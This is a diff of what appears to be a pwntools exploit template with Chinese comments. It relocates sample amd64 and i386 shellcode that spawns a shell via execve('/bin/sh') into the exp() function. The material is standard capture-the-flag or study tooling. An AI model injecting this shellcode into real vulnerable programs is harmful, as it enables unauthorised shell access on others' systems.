@@ -317,41 +317,6 @@ ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))
 
 
 
-'''
-	这里给出asm 汇编->机器代码的相关样例
-'''
-if context.arch == 'amd64':
-	shellcode = asm('''
-mov	rax, %d		/*rbx = "/bin/sh"*/
-push	rax
-mov	rdi, rsp	/*rdi -> "/bin/sh"*/
-xor	esi, esi	/*esi -> NULL*/
-xor	edx, edx	/*edx -> NULL*/
-push	0x3b
-pop	rax		/*rax = 0x3b*/
-syscall			/*execve("/bin/sh")*/
-
-label1:
-mov	rax, [rsp + %d]	/* 测试内存访问 */
-cmp	rax, 1
-je	label1		/* 测试近跳	*/
-'''%(u64('/bin/sh'.ljust(8, '\x00').encode(ENCODING)), 1))
-elif context.arch == 'i386':
-	shellcode = asm('''
-push	%d		/*"/bin"*/
-push	%d		/*"/sh\x00"*/
-mov	ebx, esp	/*ebx -> "/bin/sh"*/
-xor	ecx, ecx	/*ecx -> NULL*/
-xor	edx, edx	/*edx -> NULL*/
-push	11
-pop	eax		/*eax = 11*/
-int 0x80		/*execve("/bin/sh")*/
-
-label1:
-mov	eax, [esp + %d]	/* 测试内存访问 */
-cmp	eax, 1
-je	label1		/* 测试近跳	*/
-'''%(u32('/bin'.encode(ENCODING)), u32('/sh\x00'.encode(ENCODING)), 1))
 
 
 
@@ -407,6 +372,44 @@ def exp():
 	ip32	= lambda data							: (p32(data, signed="signed").decode(ENCODING))
 	ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))
 	'''
+
+	'''
+		这里给出asm 汇编->机器代码的相关样例
+	'''
+	if context.arch == 'amd64':
+		shellcode = asm('''
+	mov	rax, %d		/*rbx = "/bin/sh"*/
+	push	rax
+	mov	rdi, rsp	/*rdi -> "/bin/sh"*/
+	xor	esi, esi	/*esi -> NULL*/
+	xor	edx, edx	/*edx -> NULL*/
+	push	0x3b
+	pop	rax		/*rax = 0x3b*/
+	syscall			/*execve("/bin/sh")*/
+	
+	label1:
+	mov	rax, [rsp + %d]	/* 测试内存访问 */
+	cmp	rax, 1
+	je	label1		/* 测试近跳	*/
+	'''%(u64('/bin/sh'.ljust(8, '\x00').encode(ENCODING)), 1)).decode(ENCODING)
+	elif context.arch == 'i386':
+		shellcode = asm('''
+	push	%d		/*"/bin"*/
+	push	%d		/*"/sh\x00"*/
+	mov	ebx, esp	/*ebx -> "/bin/sh"*/
+	xor	ecx, ecx	/*ecx -> NULL*/
+	xor	edx, edx	/*edx -> NULL*/
+	push	11
+	pop	eax		/*eax = 11*/
+	int 0x80		/*execve("/bin/sh")*/
+	
+	label1:
+	mov	eax, [esp + %d]	/* 测试内存访问 */
+	cmp	eax, 1
+	je	label1		/* 测试近跳	*/
+	'''%(u32('/sh'.encode(ENCODING)), u32('/bin'.encode(ENCODING)), 1)).decode(ENCODING)
+
+
 
 while True:
 	try:
